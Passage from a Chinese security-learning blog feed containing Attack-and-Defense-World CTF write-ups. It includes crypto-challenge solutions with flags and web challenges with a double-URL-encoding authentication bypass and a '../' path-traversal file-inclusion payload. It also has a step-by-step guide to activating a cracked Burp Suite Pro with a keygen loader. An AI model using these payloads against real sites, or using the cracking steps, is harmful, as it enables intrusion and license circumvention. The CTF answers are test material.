(lanqiao.cn)</a></p><br/><h2 id="NISP"><a href="#NISP" class="headerlink" title="NISP"></a>NISP</h2><p>链接：<a href="https://pan.baidu.com/s/1v65ypJ0d0fbryLu6QDw-DA?pwd=xxxy"><strong>nisp一级题库</strong></a></p><p>来源链接：<a href="https://blog.csdn.net/weixin_43931875/article/details/108005695">https://blog.csdn.net/weixin_43931875/article/details/108005695</a></p><br/><p><br/>啥也不会__╭(°A°`)╮__</p><br/><br/><h1 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h1><p><a href="https://blog.csdn.net/xiaoi123/article/details/79218575">(1条消息) GPS欺骗（一）—无人机的劫持_xiaoi123的博客-CSDN博客_gps欺骗</a></p><p><strong>GPS相关内容推荐：</strong></p><p><a href="https://bbs.ichunqiu.com/thread-26651-1-1.html?from=csdn"><strong>1、 HTML5之GPS定位保存【附源码】</strong>  </a></p><p><a href="https://bbs.ichunqiu.com/thread-25476-1-1.html?from=csdn"><strong>2、源码分享：代码完结一款多用户Gps定位平台</strong>  </a></p><p><strong><a href="https://bbs.ichunqiu.com/thread-14209-1-1.html?from=beef">3、</a><a href="https://bbs.ichunqiu.com/thread-14209-1-1.html?from=csdn">克里姆林宫疑似开启GPS干扰器：当地民众定位异常</a></strong>   <a href="https://www.ichunqiu.com/course/54917?from=beef">**<br>**</a></p><p><a href="https://www.ichunqiu.com/course/54917?from=csdn"><strong>4、时空线索——Hack Key 邂逅 GPS——袁舰、张婉桥</strong>  </a></p><br/><p><a href="https://www.ichunqiu.com/zhihu?from=csdn">你想了解的炫酷白帽黑客技能都在这！【i春秋】 (ichunqiu.com)</a></p><br/><p><a href="https://www.fujieace.com/">付杰博客 - 专注“IT/互联网“领域，主攻”PHP编程+渗透测试“技术 (fujieace.com)</a></p><br/><p>不要把时间浪费在没有意义的人身上。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite_专业版</title>
      <link href="/2022/01/27/Burp-Suite-%E4%B8%93%E4%B8%9A%E7%89%88/"/>
      <url>/2022/01/27/Burp-Suite-%E4%B8%93%E4%B8%9A%E7%89%88/</url>
      
        <content type="html"><![CDATA[<br/><p>原文链接：<a href="https://www.cnblogs.com/zewutest/p/13895187.html">Burp_suite安装及使用教程(专业版) - 停泊2019 - 博客园 (cnblogs.com)</a></p><p>因为担心博主删除博文，在此copy一份原博文。（注：本文在以上文章的内容基础上有稍作添加）</p><br/><h1 id="Burp-suite安装及使用教程-专业版"><a href="#Burp-suite安装及使用教程-专业版" class="headerlink" title="Burp_suite安装及使用教程(专业版)"></a><a href="https://www.cnblogs.com/zewutest/p/13895187.html">Burp_suite安装及使用教程(专业版)</a></h1><p>1、工具下载地址：</p><p><a href="https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v1.7.37_Loader_Keygen.zip">https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v1.7.37_Loader_Keygen.zip</a></p><br/><p>工具运行需要Java环境，请自行安装，此处不赘述。（注：检测java环境是否安装完成：cmd中输入java -version 、 java 、 javac 几个命令观察返回信息）</p><p><img src="image-20220127161805395.png" alt="image-20220127161805395"></p><br/><p>解压完成后右击burp-loader-keygen.jar，以Java(TM) Platform SE binary的方式打开keygen</p><p><img src="image-20220127163321039.png" alt="image-20220127163321039"></p> <br/><p>2、修改License Text为任意值</p><p><img src="image-20220127163347339.png" alt="image-20220127163347339"></p> <br/><p>3、点击run启动burpsuite</p><p><img src="image-20220127163406354.png" alt="image-20220127163406354"></p> <br/><p>4、如果上述方式没有成功启动burpsuite，打开cmd，进入burp-loader-keygen.jar所在目录，执行命令：java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.37.jar</p><p><img src="image-20220127163425538.png" alt="image-20220127163425538"></p> <br/><p>5、打开burpsuite成功</p><p><img src="image-20220127163452793.png" alt="image-20220127163452793"></p> <br/> <br/><p>6、将Keygen中License复制粘贴到burpsuite中</p><p><img src="image-20220127163509625.png" alt="image-20220127163509625"></p> <br/><p>点击Next</p><p><img src="image-20220127163523681.png" alt="image-20220127163523681"></p> <br/><br/>7、然后点击Manual activation<p><img src="image-20220127163535688.png" alt="image-20220127163535688"></p> <br/><p>8、点击Copy request</p><p><img src="image-20220127163548330.png" alt="image-20220127163548330"></p> <br/><p>9、点击Copy request，复制完成之后，将字符串粘贴到keygen的Activation Request框里，然后Activation Response框里就有了结果，如下</p><p><img src="image-20220127163559696.png" alt="image-20220127163559696"></p> <br/><p>10、复制完后，将字符串粘贴到BurpSuite剩下的那个框里，如图，再点击Next显示激活成功</p><p><img src="image-20220127163616907.png" alt="image-20220127163616907"></p> <br/><p>11、再点击Next显示激活成功</p><p><img src="image-20220127163631335.png" alt="image-20220127163631335"></p> <br/><p>注：若出现以下情况，点击Delete即可</p><p><img src="image-20220127164816372.png" alt="image-20220127164816372"></p><br/><p>然后点击Next</p><p><img src="image-20220127163644656.png" alt="image-20220127163644656"></p><br/><p>再点击Start Burp</p><p><img src="image-20220127163700289.png" alt="image-20220127163700289"></p> <br/><p>12、burpsuite主界面</p><p><img src="image-20220127163712299.png" alt="image-20220127163712299"></p> <br/><p>13、激活之后，不能通过双击BurpSuite主程序来启动，否则启动之后还是需要输入key，两个文件必须放在一个目录下，启动方式有两种：</p><p>通过 keygen 上的 run 按钮来启动（注：本人无法通过此方法打开BurpSuite专业版）</p><p>在文件目录下执行java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.31.jar来启动.为了方便，可以将命令保存为一个bat</p><br/><p>注：bat方法：</p><p>1、当前目录下新建txt文本文档：</p><p><img src="image-20220127162213250.png" alt="image-20220127162213250"></p><p>2、将以下指令写入新建文本文档中，点击另存为另存至当前目录，相关配置数据按下图修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.37.jar</span><br></pre></td></tr></table></figure><p><img src="image-20220127162444943.png" alt="image-20220127162444943"></p><p>3、创建快捷方式拖动到桌面即可在桌面打开BurpSuite专业版</p><p><img src="image-20220127162854533.png" alt="image-20220127162854533"></p><br/><br/><p>Burpsuite神奇常用功能使用方法总结</p><p>Burpsuite介绍：</p><p>一款可以进行再WEB应用程序的集成攻击测试平台。(抓https要在浏览器中导入证书)</p><p>1、学习Proxy</p><p><img src="image-20220127163756552.png" alt="image-20220127163756552"></p> <br/><p>首先看标红，intercept is on 为拦截状态 其对应的intercept is off 为非拦截状态,设置完代理后打开拦截状态，浏览器发起的请求会被burpsuite所拦截</p><p><img src="image-20220127163811582.png" alt="image-20220127163811582"></p> <br/><p>forward: 进行请求后被拦截，点击forward可以继续此次请求，如果你点击drop则丢弃此请求数据。继续请求后能够看到返回结果</p><p><img src="image-20220127163825565.png" alt="image-20220127163825565"></p> <br/><p>可以在消息分析选项卡查看这次请求的所有内容</p><p>1）Raw 这个视图主要显示web请求的raw格式，包含请求地址， http协议版本， 主机头， 浏览器信息，accept可接受的内容类型，字符集，编码方式，cookies等,  可以手动修改这些内容，然后在点击forward进行渗透测试</p><p>2） params 这个视图主要是显示客户端请求的参数信息，get或者post的参数，cookies参数，也可以修改</p><p>3）headers是头部信息和Raw其实差不多，展示更直观</p><p>4）Hex 这个视图显示Raw的二进制内容</p> <br/><p>注意： 默认情况下，BurpProxy只拦截请求的消息，普通的文件如css,js,图片是不会拦截的，当然，想拦截什么都可以设置,我们现在知道了怎么设置代理，怎么安装，怎么进行请求拦截，怎么修改请求发起的内容向服务端进行渗透，接下来我们学习一下怎么控制这些拦截</p><p> <img src="image-20220127163841642.png" alt="image-20220127163841642"></p> <br/> <br/><p>上图为http history 所有拦截的历史均会被记录起来</p><p> <img src="image-20220127163850360.png" alt="image-20220127163850360"></p> <br/> <br/><p>Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off、Action构成，它们的功能分别是： Forward的功能是当你查看过消息或者重新编辑过消息之后，点击此按钮，将发送消息至服务器端。 Drop的功能是你想丢失当前拦截的消息，不再forward到服务器端。Interception is on表示拦截功能打开，拦截所有通过Burp Proxy的请求数据；Interception is off表示拦截功能关闭，不再拦截通过Burp Proxy的所有请求数据。 Action的功能是除了将当前请求的消息传递到Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer组件外，还可以做一些请求消息的修改，如改变GET或者POST请求方式、改变请求body的编码，同时也可以改变请求消息的拦截设置，如不再拦截此主机的消息、不再拦截此IP地址的消息、不再拦截此种文件类型的消息、不再拦截此目录的消息，也可以指定针对此消息拦截它的服务器端返回消息。                                                      </p><p>2、burpsuite使用（抓包、截包、改包）</p><p>这里推荐火狐浏览器来配合burp使用。</p><p>1）设置浏览器</p><p>工具-选项-网络设置-设置，将连接设置改为手动代理配置</p><p><img src="image-20220127163903949.png" alt="image-20220127163903949"></p> <br/><p>输入127.0.0.1:8080，点击回车，进入burp证书下载页面</p><p> <img src="image-20220127163911979.png" alt="image-20220127163911979"></p> <br/><p>点击右上角，下载证书</p><p> <img src="image-20220127163919813.png" alt="image-20220127163919813"></p> <br/><p>在选项里搜索证书，点击【查看证书】</p><p> <img src="image-20220127163927300.png" alt="image-20220127163927300"></p> <br/><p>点击【导入】，导入刚刚下载的burp证书，这样就可以使用burp抓取https请求了</p><p> <img src="image-20220127163934098.png" alt="image-20220127163934098"></p> <br/><p>这时候计算机上的火狐浏览器也设置为了代理模式。代理设置成功之后，访问网页是访问不了的，因为我们没有将请求转发，接下来就需要配置burp来转发浏览器的请求。</p><p>2）配置burp监听端口</p><p>然后打开burp</p><p> <img src="image-20220127163942277.png" alt="image-20220127163942277"></p> <br/><p>在监听的端口设置与代理的端口相同</p><p>3）抓包</p><p> 将burp设置为Intercept is on，在火狐浏览器里输入baike.baidu.com</p><p> <img src="image-20220127163950066.png" alt="image-20220127163950066"></p> <br/><p>将Intercept is on设置为Intercept is off</p><p> <img src="image-20220127163957634.png" alt="image-20220127163957634"></p> <br/> <br/><p>4）截包</p><p>这时候就需要打开拦截功能了</p><p>之前在抓包的时候可以看到，百度搜索一次要发送很多个请求，这个时候停留在第一个请求上面，这时候，如果不听地点击forward的话，就会一直发送接下来的请求。如果不停点击drop，就会把这些请求的包一个个丢掉。</p><p>5）改包</p><p>比如水果网<a href="http://www.guo68.com/%E6%90%9C%E7%B4%A2%E6%B0%B4%E6%9E%9C%EF%BC%9Apingguo%EF%BC%88%E6%90%9C%E7%B4%A2%E4%B8%AD%E6%96%87%E7%9A%84%E6%97%B6%E5%80%99%E6%8A%93%E7%9A%84%E5%8C%85%E6%98%AF%E4%B9%B1%E7%A0%81%EF%BC%8C%E4%B8%8D%E5%88%A9%E8%A7%82%E5%AF%9F%EF%BC%89">http://www.guo68.com/搜索水果：pingguo（搜索中文的时候抓的包是乱码，不利观察）</a></p><p>一直点击forward，并且查看params选项，直到参数的内容中出现pingguo</p><p> <img src="image-20220127164045075.png" alt="image-20220127164045075"></p> <br/><p>这时候把pingguo改成putao，继续点击forward或者关闭拦截功能。</p><p> <img src="image-20220127164053203.png" alt="image-20220127164053203"></p> <br/><p>便会搜索putao了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-crypto</title>
      <link href="/2022/01/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto/"/>
      <url>/2022/01/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto/</url>
      
        <content type="html"><![CDATA[<br/><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载附件得到一串字符串，根据题目知由base64加密</span><br><span class="line">字符串:Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9</span><br><span class="line">base64解密：cyberpeace&#123;Welcome_to_new_World!&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220126173105682.png" alt="image-20220126173105682"></p><p><br/><br/></p><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">凯撒密码</span><br><span class="line">借助凯撒密码转换器：https://www.qqxiuzi.cn/bianma/kaisamima.php</span><br><span class="line">一个一个地试，在位移为12时得到flag</span><br><span class="line">flag：cyberpeace&#123;you_have_learned_caesar_encryption&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220126173412479.png" alt="image-20220126173412479"></p><p>推荐题解（python解法）：<a href="https://blog.csdn.net/LEIDAqix/article/details/103600710">https://blog.csdn.net/LEIDAqix/article/details/103600710</a></p><p><br/><br/></p><h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><p>摩斯密码</p><p>借助摩斯密码转换器：<a href="http://www.all-tool.cn/Tools/morse/">http://www.all-tool.cn/Tools/morse/</a></p><p>将题目附件的字符串粘贴至此处，以空格” “为分割，”1”为长信号，”0”为短信号</p><p>得到翻译结果：MORSECODEISSOINTERESTING</p><p>结合flag提交格式，得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：cyberpeace&#123;morsecodeissointeresting&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220126174014580.png" alt="image-20220126174014580"></p><p><br/><br/></p><h2 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h2><p>题解：<a href="https://blog.csdn.net/weixin_47982238/article/details/108605756">攻防世界 | 幂数加密_Bravo！！！的博客-CSDN博客_攻防世界幂数加密</a></p><p>知道有这种方法即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;WELLDONE&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><p>栅栏密码</p><p>栅栏密码加解密(栏数5)：<a href="http://www.atoolbox.net/Tool.php?Id=777">栅栏密码加密/解密【W型】 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p><p>题解：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.cnblogs.com/yuanchu/p/13493788.html">Crypto入门 （七） Railfence （栏栅密码，正常型和W型） - 缘初 - 博客园 (cnblogs.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/qq_43504939/article/details/98473847">https://blog.csdn.net/qq_43504939/article/details/98473847</a></p><p>W型分布：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 c        c        e          h         g</span><br><span class="line">2  y      a e       f n       p e       o  o</span><br><span class="line">3   b    e   &#123;     l   c    i     r    g    &#123;</span><br><span class="line">4    e  p     r   i     e  c       -  o  </span><br><span class="line">5      r        a        -          g</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;railfence_cipher_gogogo&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h2><p>下载附件，摩斯码转换</p><p><img src="image-20220126180424316.png" alt="image-20220126180424316"></p><p>看到一串AB字符组成的字符串</p><p>培根密码：<a href="http://rumkin.com/tools/cipher/baconian.php">Baconian Cipher (rumkin.com)</a></p><p><img src="image-20220126180515895.png" alt="image-20220126180515895"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;attackanddefenceworldisinteresting&#125;</span><br></pre></td></tr></table></figure><p>题解：<a href="https://blog.csdn.net/weixin_47982238/article/details/108569470">https://blog.csdn.net/weixin_47982238/article/details/108569470</a></p><p><br/><br/></p><h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base解码-&gt;Unicode解码-&gt;base解码-&gt;写脚本得出flag</span><br></pre></td></tr></table></figure><p>base64解码器：<a href="https://base64.us/">Base64 在线编码解码 | Base64 加密解密 - Base64.us</a></p><p>unicode解码器：<a href="http://www.jsons.cn/unicode">在线Unicode编码转换-Unicode和ASCII在线互转-中文转Unicode工具 (jsons.cn)</a></p><p>打开附件看到末尾带等号”=”，猜测是base64加密，拿去解密一下</p><p><img src="image-20220126181459054.png" alt="image-20220126181459054"></p><p>“&amp;#xx；”格式，拿去进行unicode解密</p><p><img src="image-20220126182017768.png" alt="image-20220126182017768"></p><p>再来一次base64</p><p><img src="image-20220126182053304.png" alt="image-20220126182053304"></p><p>简单写一个脚本进行转换</p><p><img src="image-20220126182630823.png" alt="image-20220126182630823"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;welcometoattackanddefenceworld&#125;</span><br></pre></td></tr></table></figure><br/><p>相关知识：<a href="https://cloud.tencent.com/developer/article/1748394">30余种加密编码类型的密文特征分析（建议收藏） - 云+社区 - 腾讯云 (tencent.com)</a></p><p><br/><br/></p><h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>题解：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接（简）：<a href="https://blog.csdn.net/asd413850393/article/details/89810137">https://blog.csdn.net/asd413850393/article/details/89810137</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接（工具）：<a href="https://blog.csdn.net/qq_43734081/article/details/90447548">https://blog.csdn.net/qq_43734081/article/details/90447548</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接（冗+全）：<a href="https://blog.csdn.net/q376420785/article/details/8557266">轻松学习RSA加密算法原理_q376420785的专栏-CSDN博客</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接（python）：<a href="https://blog.csdn.net/Catherine_qingzhu/article/details/106390145">https://blog.csdn.net/Catherine_qingzhu/article/details/106390145</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RSA的计算过程是(链接（简）)：</span><br><span class="line">任选两个大质数p和q，p!=q，计算N=pq</span><br><span class="line">计算N的欧拉函数r(n)=(p-1)(q-1)</span><br><span class="line">任选一个e满足 1&lt;e&lt;r(n) ,且e与r(n)互质</span><br><span class="line">找到d，使e*d/r(n)=x……1（x是多少不重要，重要的是余数为1）</span><br><span class="line">至此（n，e）为公钥，（n，d）为私钥</span><br><span class="line">加密：C=Me(mod n)；解密：M=Cd（mod n）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;125631357777427553&#125;</span><br></pre></td></tr></table></figure><br/><p>工具下载（RSA-Tool 2 by tE!）：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://pan.baidu.com/s/1C5U22vxdQmdUzZsEn7BhXw?pwd=xxxy">https://pan.baidu.com/s/1C5U22vxdQmdUzZsEn7BhXw?pwd=xxxy</a><br>&nbsp;&nbsp;&nbsp;&nbsp;提取码：xxxy </p><p><br/><br/></p><h2 id="easychallenge"><a href="#easychallenge" class="headerlink" title="easychallenge"></a>easychallenge</h2><p>不知道为什么，我用不了uncompyle工具，密码学部分暂时到这吧，先去学点理论后再来实战</p><p><img src="image-20220126191609997.png" alt="image-20220126191609997"></p><br/><p>链接：<a href="https://blog.csdn.net/longgb123/article/details/84453640">python-uncompyle反编译_longgb123的博客-CSDN博客_uncompyle6反编译</a></p><p><br/><br/></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Web</title>
      <link href="/2022/01/21/Web-%E8%BF%9B%E9%98%B6/"/>
      <url>/2022/01/21/Web-%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<br/><h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h4 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h4><p>链接（题解）：<a href="https://blog.csdn.net/Catherine_qingzhu/article/details/105335243">https://blog.csdn.net/Catherine_qingzhu/article/details/105335243</a></p><br/><p>对于初始页面，查询到以下资料：</p><p>Apache服务器的默认首页（初始页面）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIndex index.php index.html</span><br><span class="line">或</span><br><span class="line">DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm</span><br></pre></td></tr></table></figure><p>链接：<a href="https://www.php.cn/apache/441264.html">配置Apache服务器的默认首页-Apache-PHP中文网</a></p><p>链接：<a href="https://blog.csdn.net/zhang44429824/article/details/80002105">关于配置Apache网站根目录以及默认页面_zhang44429824的博客-CSDN博客_apache默认网站根目录</a></p><br/><p>本题的flag隐藏在请求   URL/index.php   这一资源后服务器返回的响应报文的报文首部中。</p><p><img src="image-20220121141900584.png" alt="image-20220121141900584"></p><p>收获：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1、了解到响应报文的报文首部中可以隐藏一些有用的信息。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2、重新回顾了一下《图解HTTP》56页的知识，对301、302状态码有了更深一步的认识。</p><br/><br/><h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>Robots协议，与新手区的robots解题过程相似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL/robots.txt</span><br><span class="line">URL/fl0g.php</span><br><span class="line">cyberpeace&#123;76f058b55f56b5f5b05fb69fe2ff8de6&#125;</span><br></pre></td></tr></table></figure><br/><br/><h4 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h4><p>御剑工具下载：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/hackzkaq/article/details/110053457">后台扫描工具 - 御剑（珍藏版）附下载_hackzkaq的博客-CSDN博客_御剑扫描</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;注：以后这类软件，下载的时候若担心植入过木马病毒，可以装载至虚拟机中</p><p><img src="image-20220201182323211.png" alt="image-20220201182323211"></p><br/><p>.phps文件：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/loseheart157/article/details/108140659">后缀名为.phps的文件_h0ld1rs的博客-CSDN博客_index.phps</a></p><br/><p>解题过程：</p><p><img src="image-20220203110342196.png" alt="image-20220203110342196"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL/index.phps   //别管那么多，加进你的字典就完事了（御剑扫描时用到的字典）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // $_GET[id]：以 GET 方式传入一个名为 id 的变量值，变量值赋给 $_GET[id]</span><br><span class="line">    //若&quot;admin&quot;完全等价于传入值，则执行该if语句内的代码</span><br><span class="line">    if(&quot;admin&quot;===$_GET[id]) &#123;</span><br><span class="line">      echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">      exit();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //将 $_GET[id] 值进行一次 urldecode 解码</span><br><span class="line">    $_GET[id] = urldecode($_GET[id]);</span><br><span class="line">    </span><br><span class="line">    //再次判断，若为真则执行if语句中的代码</span><br><span class="line">    if($_GET[id] == &quot;admin&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">      echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">因此该题借助 urlencode 编码 &quot;admin&quot; 中任意数量的任意字符即可绕过第一个if判断。</span><br><span class="line">但由于地址栏传入参数id时，浏览器会自动对URL后面的非ASCII码的字符进行一次urlencode</span><br><span class="line">因此我们要进行两次 urlencode 编码</span><br><span class="line">admin-&gt;%61%64%6D%69%6E-&gt;%2561%2564%256D%2569%256E</span><br><span class="line">因此构造payload：URL/?id=%2561%2564%256D%2569%256E</span><br><span class="line">当然，只对一个字符进行两次 urlencode 编码也可 admin-&gt;%61dmin-&gt;%2561dmin</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">地址栏输入：URL/?id=%2561%2564%256D%2569%256E 后自动解码一次</span><br><span class="line">因此第一个if语句的比较判断为：if(&quot;admin&quot;===&quot;%61%64%6D%69%6E&quot;) </span><br><span class="line">之后解码一次：urldecode(%61%64%6D%69%6E)=admin</span><br><span class="line">最后第二个if语句的比较判断为：if(&quot;admin&quot;===&quot;admin&quot;)，从而拿到flag</span><br><span class="line">flag：cyberpeace&#123;91d2e75adf3715a0f492b9864c0eb73a&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220126163200306.png" alt="image-20220126163200306"></p><br/><p>推荐题解：<a href="https://blog.csdn.net/wyj_1216/article/details/95235159">https://blog.csdn.net/wyj_1216/article/details/95235159</a></p><br/><br/><h4 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h4><p>解题过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看网页源代码，发现注释中提示的source.php文件</span><br><span class="line">URL/source.php (地址栏IP地址后添加/source.php查看该文件)</span><br><span class="line">代码审计，发现存在另一文件hint.php</span><br><span class="line">URL/hint.php 查看该文件</span><br><span class="line">得到提示--flag位于ffffllllaaaagggg文件中</span><br><span class="line">代码审计</span><br><span class="line">GET方式传参：URL/?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">    (估计四次返回上一级目录（../）后到达根目录，否则输入4个以上的../不会得到flag)</span><br><span class="line">flag：flag&#123;25e7bce6005c4e0c983fb97297ac6e5a&#125;</span><br></pre></td></tr></table></figure><p>阅读了大量的题解及相关资料后，记录一下个人观点，因为只是浅学过php的基本语法（还是昨天学的2022/1/22），很多地方的实现细节目前并不了解，只能泛泛而谈，讲个大概。在此也不对php进行深入的了解，先广泛学习，以后再回头来深究，毕竟我还有很多东西得先了解：</p><p>1、审计代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#x27;file&#x27;])               //--1.传入值为非空</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])      //--2.传入值为字符串</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])//--3.能够通过checkFile()函数校验</span><br><span class="line">        //URL/?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">        //因此此处的$_REQUEST[&#x27;file&#x27;]值为source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">        </span><br><span class="line">    ) &#123;</span><br><span class="line">    //此时$_REQUEST[&#x27;file&#x27;]值任为:source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">    //此时include的对象值长上面那样↗，我也很懵，没见过这种用法</span><br><span class="line">    